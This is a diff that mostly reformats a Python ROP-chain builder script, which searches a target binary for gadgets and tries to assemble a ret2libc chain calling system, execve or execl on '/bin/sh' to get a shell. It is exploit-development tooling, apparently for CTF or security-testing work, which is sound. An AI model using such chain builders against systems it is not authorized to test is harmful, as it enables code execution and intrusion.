@@ -3,11 +3,11 @@
 Usage:
     python3 /opt/pof/rop_build.py --binary /input/target.elf --goal ret2libc_x64
 """
+
 from __future__ import annotations
 
 import argparse
 import json
-import sys
 
 VALID_GOALS = {"ret2libc_x64", "ret2syscall_x64", "stack_pivot"}
 
@@ -101,8 +101,10 @@ def main() -> None:
     def _diag() -> str:
         plt = sorted(getattr(proj.loader.main_object, "plt", {}).keys())
         n_write = sum(1 for g in rop.rop_gadgets if g.mem_writes)
-        return (f"{len(rop.rop_gadgets)} gadgets, {n_write} mem-write gadgets, "
-                f"PLT: {plt[:8]}")
+        return (
+            f"{len(rop.rop_gadgets)} gadgets, {n_write} mem-write gadgets, "
+            f"PLT: {plt[:8]}"
+        )
 
     def _try_shell_chain():
         binsh, binsh_info = _get_binsh_chain()
@@ -110,7 +112,7 @@ def main() -> None:
         for fname, build_args in [
             ("system", lambda sh: [sh]),
             ("execve", lambda sh: [sh, 0, 0]),
-            ("execl",  lambda sh: [sh, sh, 0]),
+            ("execl", lambda sh: [sh, sh, 0]),
         ]:
             addr = _resolve_plt(fname)
             if addr is None:
@@ -121,7 +123,11 @@ def main() -> None:
             try:
                 call_chain = cb.func_call(addr, build_args(binsh))
                 write_chain = binsh_info if hasattr(binsh_info, "payload_str") else None
-                return (write_chain + call_chain) if write_chain is not None else call_chain
+                return (
+                    (write_chain + call_chain)
+                    if write_chain is not None
+                    else call_chain
+                )
             except Exception as e:
                 tried.append(f"{fname}: {e}")
         diag = _diag()
@@ -138,9 +144,11 @@ def main() -> None:
     if not controllable_args and args.goal != "stack_pivot":
         raw_gadgets = [{"addr": hex(g.addr), "gadget": str(g)} for g in rop.rop_gadgets]
         plt = sorted(getattr(proj.loader.main_object, "plt", {}).keys())
-        shell_fns = [f for f in ("system", "execve", "execl") if any(
-            p in plt for p in (f, f"_{f}")
-        )]
+        shell_fns = [
+            f
+            for f in ("system", "execve", "execl")
+            if any(p in plt for p in (f, f"_{f}"))
+        ]
         n_write = sum(1 for g in rop.rop_gadgets if g.mem_writes)
         why = (
             f"Aucun gadget 'pop rdi/rsi/rdx/rcx' trouvé — seuls {sorted(popped)} "
@@ -195,10 +203,7 @@ def main() -> None:
             chain = cb.pivot(0x0)
     except Exception as exc:
         # Partial result: return available gadgets even when chain fails.
-        raw_gadgets = [
-            {"addr": hex(g.addr), "gadget": str(g)}
-            for g in rop.rop_gadgets
-        ]
+        raw_gadgets = [{"addr": hex(g.addr), "gadget": str(g)} for g in rop.rop_gadgets]
         plt = sorted(getattr(proj.loader.main_object, "plt", {}).keys())
         _out(
             goal=args.goal,
@@ -206,9 +211,11 @@ def main() -> None:
             binary_type=_binary_type,
             chain=raw_gadgets,
             error=str(exc),
-            notes=(f"Chain could not be built automatically — "
-                   f"{len(raw_gadgets)} raw gadgets returned. "
-                   f"PLT: {plt}"),
+            notes=(
+                f"Chain could not be built automatically — "
+                f"{len(raw_gadgets)} raw gadgets returned. "
+                f"PLT: {plt}"
+            ),
         )
         return
 
